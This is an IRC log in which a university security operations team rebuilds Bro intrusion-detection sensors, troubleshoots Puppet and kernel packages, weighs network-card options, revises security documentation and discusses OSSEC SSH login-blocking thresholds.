2014-11-04 16:59:23	soehlert	that sounds plausible
2014-11-04 16:59:26	jazoff	yeah.. or kernel-devel
2014-11-04 16:59:28	soehlert	have you checked the log
2014-11-04 17:00:11	jazoff	yeah
2014-11-04 17:00:16	jazoff	that is it
2014-11-04 17:00:23	jazoff	Cannot find include/linux/kernel.h in /lib/modules/2.6.32-431.el6.x86_64/source or /lib/modules/2.6.32-431.el6.x86_64/build
2014-11-04 17:01:22	soehlert	ah good easy enough to fix
2014-11-04 17:01:34	jazoff	yeah, I think it just needs a kernel upgrade+reboot
2014-11-04 17:01:55	jazoff	179 packages to update
2014-11-04 17:04:09	soehlert	ya forgot to do that part
2014-11-04 17:04:48	jazoff	i think things break because it has a kernel devel package, but it is for a different kernel than the running kernel
2014-11-04 17:08:11	jazoff	done, rebooting
2014-11-04 17:08:21	soehlert	ahh good to remember
2014-11-04 17:24:05	jazoff	works now
2014-11-04 17:24:41	jazoff	shitty rpm :)
2014-11-04 17:31:51	soehlert	sweet. is something wrong with 23 or is that an old alert?
2014-11-04 17:33:23	jazoff	probably from the reboot
2014-11-04 17:35:32	soehlert	ya i just checked its fine
2014-11-04 17:35:32	soehlert	do you need more space in /usr/local?
2014-11-04 17:36:16	jazoff	couldn't hurt
2014-11-04 17:37:56	jazoff	is a good thing that the broctl rewrite is mostly done
2014-11-04 17:38:07	jazoff	and the stupid locking/breaking problems will be gone
2014-11-04 17:38:39	jazoff	[root@nids-22 ~]# /usr/local/bro-2.3/bin/bro
2014-11-04 17:38:40	jazoff	/usr/local/bro-2.3/bin/bro: error while loading shared libraries: libGeoIP.so.1: cannot open shared object file: No such file or directory
2014-11-04 17:38:42	jazoff	doh
2014-11-04 17:41:34	jazoff	ok, should work now
2014-11-04 17:43:16	soehlert	what locking/breaking problems?
2014-11-04 17:44:02	jazoff	broctl gets stuck
2014-11-04 17:44:05	jazoff	easily
2014-11-04 17:45:45	soehlert	oh is that the stupid waiting for lock thing?
2014-11-04 17:45:50	jazoff	yeah
2014-11-04 17:46:14	jazoff	one problem it has which should be gone now is that if broctl install is not ran but something like status is ran, it will hang
2014-11-04 17:46:27	jazoff	so as soon as ssh came online, broctl cron rang, and froze
2014-11-04 17:47:33	soehlert	oof
2014-11-04 17:47:38	jazoff	ok, well it should be working now
2014-11-04 17:47:43	soehlert	sweet
2014-11-04 17:48:34	jazoff	i'd wait till tomorrow to change the gigamon though, I need to make dinner now 
2014-11-04 17:48:47	jazoff	but if it is working like it looks like, we can do more tomorrow
2014-11-04 17:48:58	jazoff	and the 4 minor issues or so I fixed wont hapen again
2014-11-04 17:49:05	jazoff	just need to make sure to yum update
2014-11-04 18:36:36	--	irc: disconnected from server
2014-11-04 21:22:47	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-11-04 21:22:47	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-11-04 21:22:59	--	Mode #security [+]
2014-11-04 21:22:59	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-11-05 08:10:23	jazoff	eyrich: You can turn nids 22 and nids 23 back on in the gigamon
2014-11-05 08:11:06	eyrich	done
2014-11-05 08:11:12	jazoff	i see
2014-11-05 08:12:48	jazoff	looks good
2014-11-05 09:38:14	jazoff	soehlert: do the rest today?
2014-11-05 09:52:25	wraquel	looks like grid-sec.ncsa is up but not grid-sec.org
2014-11-05 10:55:37	soehlert	jazoff: hopefully. as always, can't get on a roll with one thing since something else pops up..
2014-11-05 10:55:47	soehlert	i'm gonna try to get over there in the next 2 hours or less
2014-11-05 10:58:26	jazoff	ok
2014-11-05 11:57:57	jazoff	taking dog on a walk, should be back before you :)
2014-11-05 12:09:05	jazoff	ok :)
2014-11-05 12:14:06	soehlert	ya closing in on it, just gotta verify some CA shit is good, then Ill head over
2014-11-05 12:33:41	soehlert	jazoff: puppet help por favor?
2014-11-05 12:34:11	jazoff	what's up?
2014-11-05 12:34:33	soehlert	puppet runs give me this: /usr/bin/yum -d 0 -e 0 -y list dmks-openafs
2014-11-05 12:34:33	soehlert	Error: No matching Packages to list
2014-11-05 12:34:57	jazoff	which part is the problem?
2014-11-05 12:35:00	soehlert	yum search dkms-openafs gives me: dkms-openafs.x86_64 : DKMS-ready kernel source for AFS distributed filesystem
2014-11-05 12:35:09	jazoff	i see
2014-11-05 12:35:18	soehlert	so puppet fails to install it since it (seemingly) thinks it doesnt exist
2014-11-05 12:35:45	jazoff	what box is that on?
2014-11-05 12:35:55	soehlert	the new warm im building
2014-11-05 12:35:58	jazoff	oh!
2014-11-05 12:36:02	jazoff	dmks-openafs
2014-11-05 12:36:05	jazoff	dkms-openafs
2014-11-05 12:36:14	soehlert	oh fuck me..
2014-11-05 12:36:22	soehlert	good catch thanks
2014-11-05 12:36:35	jazoff	:)
2014-11-05 12:41:33	soehlert	wraquel: grid-sec is ready for you. i'll add to the ticket about the cname though
2014-11-05 12:43:05	soehlert	actually according to the ticket, nothing has occured yet so we're lucky to have an A record already it would seem
2014-11-05 12:48:56	soehlert	jazoff: headed over to pcf now
2014-11-05 13:17:27	soehlert	jazoff: eyrich: lets do it
2014-11-05 13:18:43	eyrich	which ones
2014-11-05 13:19:25	soehlert	jazoff: how many? two more? 4 more? the rest?
2014-11-05 13:19:43	wraquel	No whiparound meeting today. jazoff what's the status so far on the certificate interface?
2014-11-05 13:20:06	jazoff	wraquel: no progress.. new BHR is mostly done though
2014-11-05 13:20:35	wraquel	k. and splunk?
2014-11-05 13:20:39	jazoff	will start on the certificate thing very soon.. I have a feeling it is going to be pretty involved
2014-11-05 13:21:01	jazoff	didn't do anything with splunk.. are the new servers ready?
2014-11-05 13:21:25	jazoff	should be able to get the new cluster going within a day or so once they are
2014-11-05 13:23:43	soehlert	jazoff: not quite
2014-11-05 13:23:51	soehlert	got sidetrakced by bro servers and CA shit
2014-11-05 13:25:10	soehlert	jazoff: how many bro servers should we shut down now?
2014-11-05 13:25:44	jazoff	i'd say 4
2014-11-05 13:26:22	soehlert	eyrich: 24-27 then please
2014-11-05 13:27:37	eyrich	workign on it
2014-11-05 13:29:31	eyrich	done
2014-11-05 13:29:46	jazoff	looks good
2014-11-05 13:30:35	jschipp	soehlert: reminder to check for hw virtualization
2014-11-05 13:30:47	soehlert	jschipp: right. while centos is installing i will
2014-11-05 13:30:53	jschipp	thanks :)
2014-11-05 13:30:56	soehlert	actually when i reboot i will
2014-11-05 13:32:19	jazoff	those boxes should definitely have it
2014-11-05 13:32:35	jazoff	and you can actually check using /proc/cpuinfo
2014-11-05 13:32:42	jazoff	if it lists vmx, you have it
2014-11-05 13:33:58	soehlert	oh right i forgot you can check that way, oh well in the bios now
2014-11-05 13:34:48	soehlert	jschipp: ya they have it
2014-11-05 13:35:15	wraquel	well spin up a host, we're havin a malware bbq! yeehaw.
2014-11-05 13:36:13	jazoff	jschipp: munin says relay-01 /tmp is full
2014-11-05 13:47:45	jschipp	jazoff: fixed, thanks
2014-11-05 13:48:02	jschipp	I always forget about my tshark dumps
2014-11-05 13:52:20	soehlert	what are those for?
2014-11-05 13:57:31	jschipp	viewing raw syslog messages when debugging stuff
2014-11-05 14:00:42	soehlert	but is it running all the time? how is it filling stuff up? or you just forget to delete after debugging?
2014-11-05 14:00:49	soehlert	jazoff: 24 should be good?
2014-11-05 14:05:51	jazoff	not pingable?
2014-11-05 14:10:22	soehlert	what the...oook one min
2014-11-05 14:12:18	soehlert	oops musta knocked the cable loose..
2014-11-05 14:13:01	jazoff	did you fix the classes in the puppet console?
2014-11-05 14:13:04	jazoff	or did this one just stick?
2014-11-05 14:13:25	soehlert	fix the classes?
2014-11-05 14:13:31	jazoff	add them back
2014-11-05 14:13:35	soehlert	oh no i didnt touch those, but it did add bro
2014-11-05 14:13:44	soehlert	thats weird
2014-11-05 14:13:44	soehlert	i figured you added it
2014-11-05 14:13:47	jazoff	yeah, i had to set nids 22 and 23 back to bro worker
2014-11-05 14:14:25	soehlert	role: bro profile: worker
2014-11-05 14:14:28	soehlert	?
2014-11-05 14:15:04	jazoff	yeah
2014-11-05 14:15:10	jazoff	oh, need to reboot to get new kernel
2014-11-05 14:15:15	soehlert	done
2014-11-05 14:15:36	soehlert	argh i thought i did! too many effin reboots int his process
2014-11-05 14:16:14	jazoff	is there a setting for kickstart that will make it install updates during the isntall?
2014-11-05 14:16:48	soehlert	not that im familiar with.
2014-11-05 14:21:05	soehlert	so 24 is all good now then? 
2014-11-05 14:21:20	jazoff	should be
2014-11-05 14:21:23	jazoff	myricom driver installing
2014-11-05 14:21:31	soehlert	kerb auth is on for it now too
2014-11-05 14:21:42	soehlert	25 is updating, then reboot, puppet, kerb auth
2014-11-05 14:22:06	jazoff	ok:)
2014-11-05 14:22:31	soehlert	not missing a step right (puppet includes adding agent and adding role::profile)
2014-11-05 14:25:53	jazoff	yeah
2014-11-05 14:26:01	jazoff	as long as motd looks good
2014-11-05 14:26:22	eyrich	everytime I get a nagios alert for a service someone should have acked before taking down a kitten dies some where in the World
2014-11-05 14:30:21	soehlert	eyrich: they help me know where im at
2014-11-05 14:30:46	eyrich	:)
2014-11-05 14:30:51	soehlert	plus i hate cats
2014-11-05 14:30:51	soehlert	s
2014-11-05 14:41:45	soehlert	25 should be done
2014-11-05 14:44:38	eyrich	ready for me to send traffic back to any?
2014-11-05 14:45:08	jazoff	possibly. 24 should be done, checking it over now
2014-11-05 14:45:13	soehlert	24 and 25 if jazoff says so. i think they should be good
2014-11-05 14:45:24	jazoff	bro isn't running on 25 yet
2014-11-05 14:46:22	jazoff	24 looks good
2014-11-05 14:46:53	jazoff	25 is good now
2014-11-05 14:47:26	eyrich	traffic redirected
2014-11-05 14:48:16	jazoff	looks good
2014-11-05 14:50:17	eyrich	jazoff: re 100Gb project - Adam suggests maybe buying new intels instead of reusing the myricoms and buying v3 lic.  He says Seth would get us pfring+DNA lic at no cost.  Which solution would you prefer?
2014-11-05 14:50:39	soehlert	god the damn reboot time on these things is insanely awful
2014-11-05 14:50:48	jazoff	some benefit to standardizing on intel
2014-11-05 14:51:20	eyrich	what about performance and is pfring+DNA better then myricom sniffer drivers?
2014-11-05 14:51:29	jazoff	probably a wash
2014-11-05 14:53:10	eyrich	what about the running 2 myrocioms vs running 1 2xinterface intel - or would I need to buy 16 cards
2014-11-05 14:53:49	jazoff	i don't follow
2014-11-05 14:54:03	jazoff	there's potential benefits to having 2 cards, but that applies to myricom as well as intel
2014-11-05 14:54:04	eyrich	we plan on have 2x10Gb per node
2014-11-05 14:54:12	soehlert	intel has cards that have two ports on one card
2014-11-05 14:54:21	eyrich	we have 16 myricom today - and plan on doing 2 per node
2014-11-05 14:54:44	jazoff	is the license per port or per card? aren't the myricom cards we have now dual ports?
2014-11-05 14:54:57	eyrich	no the myricoms are single interface
2014-11-05 14:55:02	eyrich	yes per card
2014-11-05 14:55:27	jazoff	ah, i guess that adds up to a lot of money
2014-11-05 14:57:15	eyrich	so we get either 16 intel single port cards or 16 myricom v3 lic
2014-11-05 14:58:20	soehlert	jazoff: 26 should be good
2014-11-05 14:58:56	eyrich	traffic redirected
2014-11-05 14:59:06	eyrich	oh crap - was i supposed to wait on jazoff
2014-11-05 14:59:07	soehlert	to 26? eesh too soon!
2014-11-05 14:59:17	soehlert	ya i want him to verify bro on it before we do that
2014-11-05 14:59:41	eyrich	sorry, fixed
2014-11-05 15:00:28	jazoff	yeah, i need to run broctl install once it is online
2014-11-05 15:00:49	jazoff	broctl will try to restart bro, but doesnt know it needs to redeploy it
2014-11-05 15:01:08	jazoff	so it barfs
2014-11-05 15:01:12	soehlert	is that your broctl deploy script or whatever?
2014-11-05 15:01:25	jazoff	nah it's built into broctl
2014-11-05 15:01:30	jazoff	it just doesnt account for what we did :)
2014-11-05 15:02:07	soehlert	ahh. whats your deploy script for the myricom cards? isnt that in broctl you said?
2014-11-05 15:04:07	jazoff	no.. the myricom card is just the rpm
2014-11-05 15:04:20	jazoff	i did add a broctl plugin that ifconfig up's the interface before running bro
2014-11-05 15:04:28	jazoff	so that way it doesnt need to be configured in the OS
2014-11-05 15:05:28	soehlert	ya thats the one i was talking about
2014-11-05 15:08:59	soehlert	27 should be good
2014-11-05 15:12:40	soehlert	jazoff ?
2014-11-05 15:13:58	jazoff	yeah
2014-11-05 15:14:10	soehlert	27s good?
2014-11-05 15:14:21	jazoff	yeah
2014-11-05 15:14:22	jazoff	26 as well
2014-11-05 15:14:32	soehlert	ok. perfect. 28/29/supercell tomorrow?
2014-11-05 15:14:44	jazoff	ah.. supercell may be tricky
2014-11-05 15:14:51	soehlert	well 28/29 tomorrow then?
2014-11-05 15:14:58	soehlert	and figure out a plan for supercell
2014-11-05 15:14:59	jazoff	yeah, definitely
2014-11-05 15:15:11	jazoff	i need to go through supercell and see if there is anything pre-puppet
2014-11-05 15:15:16	soehlert	cool then im off to eat lunch/happy hour after that
2014-11-05 15:15:20	jazoff	i don't think there is, but should doublecheck
2014-11-05 15:15:48	soehlert	eyrich: ntpd should not be turned on for vms right/
2014-11-05 15:16:11	eyrich	yes
2014-11-05 15:16:18	jazoff	ah yeah, I think i need to puppetize the splunk forwader fully
2014-11-05 15:16:33	jazoff	it's mostly done, should be able to just deploy the rpm via the repo now
2014-11-05 15:16:46	soehlert	eyrich: shit. HSMs require it running.
2014-11-05 15:18:11	eyrich	ok but you can set it run against its own clock and not external sync
2014-11-05 15:18:49	soehlert	alright ill look into that tomorrow then
2014-11-05 15:18:58	eyrich	ready for any traffic redirection?
2014-11-05 15:19:02	jazoff	yeah
2014-11-05 15:19:43	soehlert	ok im out
2014-11-05 15:19:52	jazoff	eyrich: turn it all back on
2014-11-05 15:20:36	eyrich	ok back to normal now
2014-11-05 15:22:52	eyrich	jazoff: so do you have an opinion on the nic thing?
2014-11-05 15:23:34	jazoff	not really. either is fine with me
2014-11-05 15:23:58	jazoff	other than standardizing on commodity intel cards there isn't much difference
2014-11-05 15:51:25	jschipp	soehlert: awesome, thanks for looking < late response
2014-11-06 09:42:03	jschipp	http://blog.docker.com/wp-content/uploads/2013/08/docker-meme.jpg
2014-11-06 09:42:21	wraquel	:)
2014-11-06 09:45:16	jschipp	I can't get enough of it lol
2014-11-06 09:45:36	jschipp	unfortunately that's the only good one I've seen so far
2014-11-06 10:16:23	soehlert	jazoff: eyrich, do the last two bro workers shortly?
2014-11-06 10:16:34	jazoff	yes
2014-11-06 10:26:54	jschipp	Why were the Myricom cards for the new bro order? Did they perform better than the intels? 
2014-11-06 10:28:03	jschipp	cards chosen*
2014-11-06 10:28:06	soehlert	they were just licenses for the driver
2014-11-06 10:28:13	soehlert	though it sounds like we may be getting intels instead anyway
2014-11-06 10:28:18	soehlert	we already have the myricom cards
2014-11-06 10:28:24	jschipp	ah
2014-11-06 10:44:44	soehlert	jazoff: eyrich you guys ready?
2014-11-06 10:44:48	jazoff	yep
2014-11-06 10:46:25	soehlert	while we wait for eyrich, quick story time. so there was a dude standing outside NPCF so I went out to let him in to see what was going on. I guess there's some fancy person board meeting and nobody was downstairs so he was locked out. So anyways, I escorted him to the conference room, and there's the door. Right next to the door is a big glass wall, and he walked just head first into that
2014-11-06 10:46:25	soehlert	wall next to the door.
2014-11-06 10:49:15	jazoff	:)
2014-11-06 10:54:31	jschipp	lol
2014-11-06 10:54:40	jschipp	rough morning
2014-11-06 10:55:25	soehlert	not to mention the meeting was already going on so it was pretty quiet in there. so EVERYONE turned to look
2014-11-06 10:55:32	wraquel	lol
2014-11-06 11:00:51	soehlert	wraquel: is eyrich in today?
2014-11-06 11:01:14	jazoff	if not, i could eat now :)
2014-11-06 11:01:25	wraquel	soehlert: yes.
2014-11-06 11:01:41	wraquel	I hear him. I'll go tell him.
2014-11-06 11:03:09	eyrich	im here
2014-11-06 11:04:09	eyrich	had a talk with neteng about the netsec switch upgrade - it will be ugly. like 1.5 hour outage
2014-11-06 11:04:25	soehlert	god not looking forward to that. what kinda time frame we loking at?
2014-11-06 11:05:47	jazoff	any reason we can't get 2 ToR switches? seems like a big SPOF there...
2014-11-06 11:06:15	soehlert	i think they said after this code upgrade it wont be a SPOF anymore...somehow
2014-11-06 11:07:00	eyrich	right after the code upgrade you can upgrade each box one at a time.
2014-11-06 11:07:19	eyrich	2 seperate boxes dont work because NCSA insists on routing at the edge
2014-11-06 11:07:47	eyrich	ready for me to shift traffic?
2014-11-06 11:07:53	jazoff	yes
2014-11-06 11:08:15	jazoff	routing to the edge shouldn't preclude redudancy
2014-11-06 11:08:23	jazoff	that is what hsrp/varp/vrrp is for...
2014-11-06 11:08:40	eyrich	traffic moved
2014-11-06 11:09:05	jazoff	looks good
2014-11-06 11:09:08	eyrich	they dont cross connect edge switches - everything goes back to the core - and vlans dont go through the core
2014-11-06 11:09:18	eyrich	its not how I would do it
2014-11-06 11:09:46	jazoff	what device is 141.142.148.1 ?
2014-11-06 11:12:19	soehlert	woah I think they just rebooted BW. It got reaaaaally quiet in here and all of a sudden like an explosion of fans.
2014-11-06 11:12:48	eyrich	net-sec switch
2014-11-06 11:13:02	jazoff	you'd think they would do some sort of staggered reboot to avoid huge power surges 
2014-11-06 11:13:12	eyrich	it could have been an EPO
2014-11-06 11:13:45	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Connection reset by peer)
2014-11-06 11:14:03	jazoff	i think eyrich just EPOd himself
2014-11-06 11:14:11	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-11-06 11:14:18	jazoff	speaking of EPO :)
2014-11-06 11:14:39	eyrich	another kitten down
2014-11-06 11:14:58	jazoff	odd, did not get text
2014-11-06 11:15:13	jschipp	EPO?
2014-11-06 11:15:19	eyrich	emergency power off
2014-11-06 11:15:22	soehlert	Emergency power off
2014-11-06 11:15:25	jschipp	kk
2014-11-06 11:15:37	soehlert	one more kitten to go today eyrich
2014-11-06 11:16:22	eyrich	did BW stop using IRC?
2014-11-06 11:16:37	soehlert	dunno i stopped using bw irc ages ago
2014-11-06 11:17:41	eyrich	(11/6/2014 10:41:35 AM) dmdalton: We are cold booting the Cray
2014-11-06 11:17:42	eyrich	(11/6/2014 10:42:04 AM) dmdalton: 100's of nodes require an L0 power cycle clear
2014-11-06 11:18:33	jazoff	they call the cluster "the cray" ?
2014-11-06 11:18:47	eyrich	either that or the main frame
2014-11-06 11:19:01	eyrich	as ooposed to JYC / TDS
2014-11-06 11:30:02	soehlert	arghhh why does nids-29 use a different nic naming scheme...no wonder it was failing
2014-11-06 11:30:23	eyrich	in different slot?
2014-11-06 11:30:25	jazoff	i just lost supercell
2014-11-06 11:30:45	jazoff	nm
2014-11-06 11:30:53	jazoff	ssh just froze for some reason
2014-11-06 11:30:56	soehlert	no it calls the first onboard nic eth1 vs eth2 in the others
2014-11-06 11:30:56	soehlert	but now i see its because nids-29 only has one myricom not 2
2014-11-06 11:31:33	jazoff	yeah, I remember noticing that a while ago
2014-11-06 11:32:14	jazoff	it can be changed after the install, see /etc/udev/rules.d/70-persistent-net.rules
2014-11-06 11:32:21	jazoff	i used to rename my capture interfaces sniff1/sniff2
2014-11-06 11:33:15	soehlert	ya i know about that, but it threw me during this part since it decides how to name them itself and i cant change that here
2014-11-06 11:51:20	soehlert	28 should be good
2014-11-06 11:52:41	jazoff	yeah. bro should auto restart now in a few mins
2014-11-06 11:59:47	soehlert	29 ready
2014-11-06 12:04:43	soehlert	is it all looking ok jazoff?
2014-11-06 12:04:50	jazoff	yeah
2014-11-06 12:05:23	soehlert	ok cool. im gonna go home for lunch then
2014-11-06 12:05:31	eyrich	ready for traffic?
2014-11-06 12:05:37	jazoff	28 is
2014-11-06 12:06:18	eyrich	re directed
2014-11-06 12:12:50	eyrich	let me ow when 29 is gtgt
2014-11-06 12:12:52	eyrich	gtg
2014-11-06 12:13:27	jazoff	fixing now.. had to change config since the interface is now at eth0
2014-11-06 12:16:30	jazoff	ok, fixed
2014-11-06 12:16:40	eyrich	ready then?
2014-11-06 12:17:30	jazoff	yes
2014-11-06 12:17:55	eyrich	ok done
2014-11-06 12:18:17	jazoff	and done :)
2014-11-06 12:18:22	eyrich	cool - going to lunch
2014-11-06 13:15:10	soehlert	jazoff: this seems more like it should be your review. https://wiki.ncsa.illinois.edu/display/BWDOC/Netflow+Collectors
2014-11-06 13:15:24	soehlert	seem fair for me to give up authority to you on that one?
2014-11-06 13:22:00	jazoff	sure
2014-11-06 13:22:20	soehlert	I think you just have to review it and fix anything that looks wrong
2014-11-06 13:22:32	wraquel	yep
2014-11-06 13:22:34	wraquel	easy peasy
2014-11-06 13:22:42	wraquel	unless there were significant changes....
2014-11-06 13:23:38	soehlert	wraquel: how do i change it to be jazoff? i can edit it and type his name but the you don't get the fancy link. i tried @justinazoff too and it failed
2014-11-06 13:23:43	jazoff	not sure if the 1 year part is accurate
2014-11-06 13:23:48	jazoff	try @jazoff
2014-11-06 13:24:02	soehlert	nope
2014-11-06 13:24:13	soehlert	doesnt become a link just shows up as is
2014-11-06 13:24:15	wraquel	fixed it
2014-11-06 13:24:22	wraquel	Hit @ then tstart typing his name
2014-11-06 13:24:34	soehlert	i tried that it just showed up as is and didnt link him
2014-11-06 13:24:45	soehlert	nothing popped up when I started typing his name
2014-11-06 13:24:55	wraquel	weird
2014-11-06 13:25:15	soehlert	wait now it works..
2014-11-06 13:26:57	soehlert	wraquel: who are these docs for? the bastion hosts one seems to have waaay more info for anyone besides me and jschipp basically
2014-11-06 13:27:36	wraquel	I may have hit a few extra pages than was intended.
2014-11-06 13:27:50	soehlert	what do you mean?
2014-11-06 13:27:53	wraquel	But Kramer wants our docs to be up to date.
2014-11-06 13:28:28	soehlert	i realize we are updating them, but this one has step by step instructions on setting up the iptables and whatnot..
2014-11-06 13:28:54	soehlert	seems like needless info for anyone outside our group
2014-11-06 13:29:02	wraquel	It's our security plan that's needed for NSF review.
2014-11-06 13:29:54	wraquel	If there's stuff in those docs that are too technical or only for us then they should be taken out and put on a KB in our space or something.
2014-11-06 13:30:29	soehlert	well i guess im asking how technical it should be. this looks like a dump of tims notes on how he set up each individual thing. 
2014-11-06 13:31:25	wraquel	To give you an idea, look for 'Security-BWDOC' on this page: https://wiki.ncsa.illinois.edu/pages/viewpageattachments.action?pageId=25429647&highlight=Security-BWDOC-260613-1154-3318.pdf#NSF+Review+-+July+17-19%2C+2013+-+internal-attachment-Security-BWDOC-260613-1154-3318.pdf
2014-11-06 13:31:39	wraquel	This is the review documentation they give to NSF for their review of our security plan.
2014-11-06 13:31:48	wraquel	It looks like it's just a wiki dump.
2014-11-06 13:31:49	soehlert	ok thanks
2014-11-06 13:32:15	wraquel	I agree though, the technical setup stuff should probably be somewhere else and this doc should probably cover general security controls.
2014-11-06 13:32:20	wraquel	Not finegrained configuration.
2014-11-06 13:33:32	soehlert	haha crap. that dump is just showing what it looks like now. but bastion host seems to be the only page with that level of detail
2014-11-06 13:41:14	soehlert	ok i think i'm going to redo this one.remove all the technical details and just type a few paragraphs on the software configured on there and their uses. does that sound acceptable?
2014-11-06 13:41:34	wraquel	yep
2014-11-06 13:41:43	wraquel	Wait, is the bastion hosts in that dump
2014-11-06 13:41:47	soehlert	ya
2014-11-06 13:41:53	soehlert	and its the same thing it shows now
2014-11-06 13:41:54	wraquel	then ya
2014-11-06 13:42:03	soehlert	which is way different than what every other section is
2014-11-06 14:08:53	eyrich	im sending the 100Gb project quotes to Tim
2014-11-06 14:19:06	soehlert	wraquel: do i need to do something after editing those docs? just tell you? tell adam? mark on some page somewhere?
2014-11-06 14:26:43	soehlert	nvm got it
2014-11-06 14:37:21	wraquel	Put a checkmark on https://wiki.ncsa.illinois.edu/display/CSD/BW+Documentation+Review to let me know
2014-11-06 14:37:46	jazoff	so yeah, the netflow archives...
2014-11-06 14:37:55	jazoff	we dont actually have a control in place that removes them after a year
2014-11-06 14:37:56	jazoff	should we?
2014-11-06 14:38:39	wraquel	we don't?
2014-11-06 14:38:42	wraquel	Yeah, we should
2014-11-06 14:38:49	soehlert	there should be a cron job on lowp for that.
2014-11-06 14:38:55	jazoff	hmm
2014-11-06 14:39:08	wraquel	are they not clearing off of netflow-sec?
2014-11-06 14:39:09	wraquel	flows-sec
2014-11-06 14:39:17	jazoff	they are, but they get archived on lowp
2014-11-06 14:39:29	jazoff	flows-sec auto expires based on space
2014-11-06 14:45:36	eyrich	pfsense NAT updated
2014-11-06 14:52:08	eyrich	NAT rules updated
2014-11-06 14:52:31	soehlert	what were the updates for?
2014-11-06 14:52:40	wraquel	BW Doc updates
2014-11-06 14:52:43	eyrich	yes
2014-11-06 14:53:04	eyrich	I am waiting on ossec ssh blocking thresholds for the BHR docs
2014-11-06 14:55:59	wraquel	hmmm. That's.. I just saw it... 6 alerts in 120 seconds
2014-11-06 14:56:18	wraquel	<rule id="5712" level="10" frequency="6" timeframe="120" ignore="60">
2014-11-06 14:57:16	soehlert	i sent you an email about that this morning
2014-11-06 14:57:49	soehlert	although now im questioning the numbers i have, whered you get yours wraquel
2014-11-06 14:58:08	wraquel	/var/ossec/rules/sshd_rules.xml on tempest
2014-11-06 14:58:33	soehlert	ahh ya thats not the right ones
2014-11-06 14:58:34	wraquel	what the...
2014-11-06 14:58:36	--	wraquel is now known as wardog
2014-11-06 14:58:41	soehlert	  <rule id="5712" level="10" frequency="18" timeframe="600" ignore="60" overwrite="yes">
2014-11-06 14:58:47	soehlert	local_rules.xml
2014-11-06 14:58:52	wardog	aaaaah
2014-11-06 14:59:05	soehlert	you found the default rules, but we've tweaked em
2014-11-06 14:59:16	wardog	on temptest?
2014-11-06 14:59:18	soehlert	anyways eyrich, ignore my email, says the same thing i just posted
2014-11-06 14:59:20	soehlert	ya
2014-11-06 15:22:20	soehlert	wardog: will you take a peek at the bastion host one and lemme know what you think? https://wiki.ncsa.illinois.edu/display/BWDOC/Bastion+Hosts
2014-11-06 15:23:28	wardog	BradJ-UColo: so, I'm looking at the password dump figuring out why my count was off. yep
2014-11-06 15:23:34	wardog	awesome
2014-11-06 15:25:58	wardog	Looks good. Made a few minor edits
2014-11-06 15:26:28	soehlert	wardog: whats with the BradJ thing?
2014-11-06 15:26:47	wardog	just me not finishing a thought on a different irc channel/server
2014-11-06 15:27:12	wardog	and accidentally typing 'yes' and 'enter' here.
2014-11-06 15:27:14	eyrich	what is the default ossec requested block time? does it just follow the same as bro now with short times for first time offenders?
2014-11-06 15:28:00	soehlert	ah ok. the awesome threw me off like that brad thing was awesome. but i felt i was lacking some context haha
2014-11-06 15:28:06	soehlert	one sec eyrich 
2014-11-06 15:28:33	soehlert	864000
2014-11-06 15:29:16	eyrich	ok it now says:
2014-11-06 15:29:17	eyrich	If there are 18 failed attempts to login to an NCSA system from an external IP address within 10 minutes, OSSEC will blacklist that IP for 10 days by adding it to the black hole router.
2014-11-06 15:29:39	soehlert	ah sorry that's actually 20. ossec does something stupid where it's two more than the number in the frequency variable
2014-11-06 15:29:58	eyrich	eventually we need to have ossec do the dynamic block time thing too
2014-11-06 15:30:02	eyrich	- i think
2014-11-06 15:30:35	soehlert	i would be down for that, but i dont really have lots of time to dump into that. just a few more machines to puppetize and then i can hopefully get back to regularly scheduled stuff
2014-11-06 15:30:51	eyrich	no prob
2014-11-06 15:31:06	soehlert	unfortunately theres a LOT of puppet in there as well, but ya know..
2014-11-06 15:31:31	soehlert	i checked with bruce on the status of my laptop yesterday since this 4G of RAM here is killing me. they haven't filled out my RMA form yet :(
2014-11-06 15:37:51	soehlert	jazoff: cyclone is being retired when we finish the new splunk cluster right?
2014-11-06 15:38:08	soehlert	we're not going to run two splunk instances correct?
2014-11-06 15:41:52	jazoff	hmm
2014-11-06 15:42:25	jazoff	wardog: oh, there's a setting in irssi for that I think
2014-11-06 15:42:47	soehlert	jazoff: was that hmm for me? are we actually keeping both?
2014-11-06 15:43:15	jazoff	wardog: nm.. window_history doesnt help with partial lines
2014-11-06 15:43:24	jazoff	soehlert: yeah.. we should not keep both
2014-11-06 15:43:30	jazoff	but they will coexist for a brief time
2014-11-06 15:43:39	jazoff	need to figure out how to export/import some of the logs
2014-11-06 15:43:53	soehlert	ok i just wanted to note from a long term view if i have to worry about moving it over to centos
2014-11-06 15:43:58	soehlert	answer being
2014-11-06 15:43:58	soehlert	no
2014-11-06 15:44:41	wardog	I just didn't send, got distracted, noticed an alert, changed channels and boom
2014-11-06 15:45:15	jazoff	ah, my weechat config doesnt have that problem
2014-11-06 15:45:25	jazoff	i forget if that was the default though
2014-11-06 15:48:13	soehlert	woo that hosts list update felt good.
2014-11-06 15:54:58	jschipp	err, i waited 2.5 hours for appointment, ridiculous
2014-11-06 15:55:57	soehlert	damn, doctor?
2014-11-06 15:56:07	jschipp	yeah
2014-11-06 15:56:29	soehlert	i hate the stupid overscheduling garbage they do
2014-11-06 15:58:10	wardog	jschipp: this is why I prefer morning appointments. Less chance of getting bumped
2014-11-06 15:58:47	eyrich	agreed - i like the 7:30am ones
2014-11-06 15:58:58	eyrich	well, prefer/like
2014-11-06 15:59:03	wardog	When I had my hand surgery I had to drive to Springfield for 5 minute checkup. waste... of... time....
2014-11-06 16:05:50	jschipp	ah
2014-11-06 16:06:07	jschipp	mornings and I don't work well lol
2014-11-06 16:06:44	soehlert	jschipp: then shoot for the 1pm ones
2014-11-06 16:06:49	soehlert	docs are just finishing lunch
2014-11-06 16:06:56	soehlert	im with you on this one. down with mornings!
2014-11-06 16:09:43	jschipp	:)
2014-11-06 16:10:38	soehlert	speaking of apptmnts, gotta drop something off at the vet. be back in a bit if anyone needs anything
2014-11-06 16:12:45	jazoff	so I looked at supercell, I think other than splunk, everything should be in puppet
2014-11-06 16:18:38	jazoff	and the bro config for splunk is in puppet, so it's really just the initial splunk setup that isn't
